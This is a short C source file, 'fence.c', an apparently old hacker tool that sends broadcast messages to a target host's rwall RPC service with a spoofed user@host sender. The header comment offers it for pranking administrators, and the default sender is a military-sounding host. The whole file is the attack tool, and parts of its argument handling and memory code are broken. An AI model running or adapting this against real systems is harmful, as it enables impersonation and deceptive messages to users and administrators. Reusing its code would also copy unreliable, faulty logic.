/* fence.c
 * nirosys at 0xcd80 dot org
 * * * * * * * * * * * * * * * *
 * This is a simple replacement for
 * rwall. ;)
 *
 * It will allow you to spoof user@host
 * entries in the broadcast message.
 * 
 * A default message looks something like:
 * Broadcast Message from root (???) on yourbox Thu Feb  6 01:12:23...
 * Broadcast Message from user@host.com        (/dev/ttyp0) at 12:23 ...
 * Hey, we're shutting down!
 *
 * Now, that user@host.com can be change.. *twirls finger*
 *
 * Have some fun with those admins who still think RPC is necessary..
 * or those who don't know wtf it is.. or why 20+ services are
 * running on their system.
 * * * * * * * * * * * * * * * */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <rpc/rpc.h>

#define DEF_USER "root"
#define DEF_HOST "romulus.ncsc.mil"
#define DUMB_MESSAGE "Broadcast Message from %s@%s        (/dev/ttyp0)"\
		     " at 12:23 ...\n%s\n" 
#define USAGE	"fence <host> [user@host] <message>"
#define WALLPROG 100008
#define WALLVERS 1
#define WALLPROC_WALL 2
struct timeval timeout = { 35, 0 };

int main( int argc, char **argv ) {
   CLIENT	*cl;
   char *hostname, *user,*buffer, out;

   if ( (argc < 2) || (argc > 4) ) {
      printf("Usage: %s\n",USAGE);
      exit(0);
   } 
   if ( argc == 2 ) { /* no user@host */
      hostname = DEF_HOST;
      user = DEF_USER;
   }
   else if ( (hostname=strchr(argv[2],'@')) == NULL) {
      printf("Check your user@host..\n");
      printf("Usage: %s",USAGE);
      exit(0);
   }
   *hostname++ = 0x0;
   user = argv[2];
   buffer = (char *)malloc(strlen(argv[(argc==2)?2:3])+ 
         strlen(DUMB_MESSAGE) + strlen(user)+strlen(hostname));
   sprintf(buffer,DUMB_MESSAGE,user,hostname,argv[(argc==2)?2:3]);
   cl = clnt_create(argv[1],WALLPROG,WALLVERS,"udp");
   if (!cl) clnt_pcreateerror(argv[1]),exit(0); 
   if (clnt_call(cl,WALLPROC_WALL,(xdrproc_t)xdr_wrapstring,(char *)&buffer,
            (xdrproc_t)xdr_void,&out,timeout) != RPC_SUCCESS) {
      clnt_perror(cl,argv[1]);
   }
   free(buffer);
}
